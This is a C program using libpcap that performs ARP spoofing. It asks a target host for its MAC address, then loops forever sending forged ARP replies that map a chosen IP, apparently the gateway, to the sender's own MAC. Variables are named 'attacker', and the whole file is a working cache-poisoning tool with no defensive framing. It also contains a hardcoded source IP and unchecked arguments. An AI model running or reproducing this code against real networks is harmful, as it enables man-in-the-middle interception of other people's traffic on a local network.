#include <sys/types.h>
#include <sys/errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/fcntl.h>
#include <net/if.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pcap.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>




int main(int argc, char *argv[])
{


    struct ifreq ifr;
    int sock;
    if((sock=socket(AF_INET,SOCK_STREAM,0))<0){

        perror("socket error!\n");
        return -1;

    }
    strcpy(ifr.ifr_name,argv[1]);
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);

    if(handle==NULL){
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;

    }

    if(ioctl(sock,SIOCGIFHWADDR,&ifr)<0){
          perror("ioctl error!");
          return -1;
    }

    struct ether_header sender_eth_header;
    struct ether_arp sender_arp_header;

    struct ether_header attacker_eth_header;
    struct ether_arp attacker_arp_header;




    memset(attacker_eth_header.ether_dhost,0xff,sizeof (attacker_eth_header.ether_dhost));                  //dmac : broadcast
    memcpy(attacker_eth_header.ether_shost,ifr.ifr_hwaddr.sa_data,sizeof(attacker_eth_header.ether_shost)); //smac : mymac

    attacker_eth_header.ether_type=htons(ETHERTYPE_ARP);                                                    //arp : 0806

    attacker_arp_header.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);                                                //ethr : 0001
    attacker_arp_header.ea_hdr.ar_pro = htons(ETHERTYPE_IP);                                                //ipv4 : 0800
    attacker_arp_header.ea_hdr.ar_hln = 0x06;                                                               //HWsize : 06
    attacker_arp_header.ea_hdr.ar_pln = 0x04;                                                               //PTsize :04
    attacker_arp_header.ea_hdr.ar_op = htons(ARPOP_REQUEST);                                                //opcode : 0001(request)

    memcpy(attacker_arp_header.arp_sha,attacker_eth_header.ether_shost,sizeof(attacker_arp_header.arp_sha)); //SMac : mymac
    memset(attacker_arp_header.arp_tha,0x00,sizeof(attacker_arp_header.arp_tha));                           //TargetMac


    attacker_arp_header.arp_spa[0]=0xc0;
    attacker_arp_header.arp_spa[1]=0xa8;
    attacker_arp_header.arp_spa[2]=0x2b;
    attacker_arp_header.arp_spa[3]=0x8d;



    char *m_IpAddr;
    int i = 1;
    m_IpAddr = (strtok(argv[2],"."));

    attacker_arp_header.arp_tpa[0] = atoi(m_IpAddr);
    while(i!=4){


        m_IpAddr = strtok(NULL,".");

        attacker_arp_header.arp_tpa[i] = atoi(m_IpAddr);
        i++;
    }
    u_char req_p[42];
    memcpy(req_p, &attacker_eth_header,14);
    memcpy(req_p+14,&attacker_arp_header,28);
    pcap_sendpacket(handle,req_p,sizeof(req_p));


        struct pcap_pkthdr* header;
           const u_char* packet;
           int res = pcap_next_ex(handle, &header, &packet);

           memcpy(attacker_eth_header.ether_dhost,(packet)+6,sizeof(attacker_eth_header.ether_dhost));
           for(int x=0;x<6;x++){
               attacker_arp_header.arp_tha[x] = packet[x+6];
           }
//           memcpy(attacker_arp_header.arp_tha,(packet)+6,sizeof(attacker_arp_header.arp_tha));
        //   memcpy(attacker_arp_header.arp_spa,attacker_arp_header.arp_tpa,sizeof(attacker_arp_header.arp_spa));
           char *m_IpAddr2;
           int j = 1;
           m_IpAddr2 = (strtok(argv[3],"."));

           attacker_arp_header.arp_spa[0] = atoi(m_IpAddr2);
           while(j!=4){


               m_IpAddr2 = strtok(NULL,".");

               attacker_arp_header.arp_spa[j] = atoi(m_IpAddr2);
               j++;
           }
           attacker_arp_header.ea_hdr.ar_op = htons(ARPOP_REPLY);
           while(true){
           u_char req_p2[42];
           memcpy(req_p2, &attacker_eth_header,14);
           memcpy(req_p2+14,&attacker_arp_header,28);
           pcap_sendpacket(handle,req_p2,sizeof(req_p2));
}


    return 0;
}
